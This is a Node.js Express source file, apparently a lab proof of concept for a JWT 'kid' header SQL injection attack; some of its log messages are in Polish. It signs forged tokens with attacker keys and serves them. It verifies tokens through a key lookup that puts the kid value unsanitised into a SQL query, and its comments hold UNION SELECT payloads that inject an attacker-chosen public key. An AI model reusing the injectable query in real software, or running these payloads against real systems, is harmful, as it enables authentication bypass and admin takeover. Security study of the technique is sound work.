const Express = require('express');
const jwt = require('jsonwebtoken');
const fs = require('fs');
const jose = require('node-jose');
const jwktopem = require('jwk-to-pem')
const axios = require('axios')
const app = new Express();
var sqlite3 = require('sqlite3').verbose();
app.use(Express.json())
let db1 = new sqlite3.Database('vuln_api.db');
let publicKeys = []
const result = db1.get("SELECT pem FROM keys where id = 3");
console.log(result)
  db1.each("SELECT pem FROM keys where id = 3", function(err, row) {
    publicKeys.push(row)
  });
  console.log(publicKeys)

// define the payload


app.get('/jwks', async (req, res) => {
    const ks = fs.readFileSync('attacker_keys.json')
    const keyStore = await jose.JWK.asKeyStore(ks.toString())
    
    res.send(keyStore.toJSON())
  })
  app.get('/tokens', async (req, res) => {
    const ks = fs.readFileSync('attacker_keys.json')
    const keyStore = await jose.JWK.asKeyStore(ks.toString())
    const [key] = keyStore.all({ use: 'sig' })
    
    const opt = { compact: true, jwk: key, fields: { typ: 'jwt', kid: "3" } }
    const payload = JSON.stringify({
      exp: Math.floor((Date.now() + 24*60*60*1000) / 1000),
      iat: Math.floor(Date.now() / 1000),
      sub: 'test',

    })
    let token = await jose.JWS.createSign(opt, key)
      .update(payload)
      .final()
    token = token.toString('base64')
    res.send({ token})
  })
  app.get('/verify', validateToken, async (req, res) => {
    res.send("atak jako localhost:5002 / admin udany")
  })
  app.get('/admin', validateToken, async (req, res) => {
    const token = req.body.token
    var decoded = JSON.parse(jwt.decode(token));
    if(decoded.user== 'admin'){
      res.send("atak jako localhost:5002 / admin udany")
    }
    else{
      res.status(403).send("not admin gtfo")
    }

    console.log(decoded)
  })
  app.get('/data', (req, res)=>{
    sql = "SELECT pem FROM keys where id = 3";
    db1.all(sql, [], (err, rows)=>{
      return res.json({status:200, data:rows, success: true})
    })
  })//`0 UNION SELECT \'-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDOZ2ZxoEmy0oSkE+XF1Nau+7OM\nw1uHQiasyx6Tvp+SEVjRf+gcIuUdfbVIni1QcrM6jnqBM/HokCH+3/prTc1yKi31\nU41a7bRreb20qYDN7cvGf4UdQsoNbIgfC65OcTPAxHMdGcOTiLRqi4HjpyEPfbv7\nJ0j2DeRQPMOUk6xLDwIDAQAB\n-----END PUBLIC KEY-----\'`
  
  async function validateToken(req, res, next) {
    const token = req.body.token
    var decoded = jwt.decode(token);
    const header = JSON.parse(Buffer.from(token.split('.')[0], 'base64').toString())
    console.log(header)
    //header.kid = `0 UNION SELECT \'-----BEGIN RSA PUBLIC KEY-----\nMIGJAoGBAM3CosR73CBNcJsLv5E90NsFt6qN1uziQ484gbOoule8leXHFbyIzPQRozgEpSpiwhr6d2/c0CfZHEJ3m5tV0klxfjfM7oqjRMURnH/rmBjcETQ7qzIISZQ/iptJ3p7Gi78X5ZMhLNtDkUFU9WaGdiEb+SnC39wjErmJSfmGb7i1AgMBAAE=\n-----END RSA PUBLIC KEY-----\'`
    let kid = header.kid
    //publicKey  = db.get("SELECT pem FROM keys where id= "+header.kid)
    //let publicKeys = []
    //const result = db1.get("SELECT pem FROM keys where id = 3");
    //let results12 = await getData()
    //console.log("hereere"+results12)
    //console.log(results1);
    const pem = await getPemById(db1, kid);
      if (token == null) res.sendStatus(400).send("Token not present")
     // console.log(publicKeys)
     let publicKey = pem
     console.log(publicKey)
     jwt.verify(token, publicKey, (err, user) => {
      if (err) {
        console.log(err)
          res.status(403).send("Token invalid")
      }
      else {
          req.user = user
          next() //proceed to the next action in the calling function
      }
  })
}
     //const key = await jose.JWK.asKey(publicKey);
     //const key = await jose.JWK.asKey(publicKey, 'pem');
     //const verifier = jose.JWS.createVerify(key);
     //const v = await verifier.verify(token);
     //console.log(v.header)
    // console.log(v.payload.toString())
      //console.log("SELECT id, pem FROM keys where id= "+header.kid)
      //db.each("SELECT pem FROM keys where id= "+header.kid, function(err, row) {
       // console.log(row);
      //});

      //const{ data} = await axios.get("http://localhost:5001/jwks")
    
    //next() 
    

    

async function getPemById(db, kid) {
  return new Promise((resolve, reject) => {
      db.get(`SELECT pem FROM keys where id = ${kid}`,(err, row) => {
          if (err) reject(err); // I assume this is how an error is thrown with your db callback
          resolve(row.pem);
      });
  });
}

  app.listen(5001, () => console.log('server started :5001'))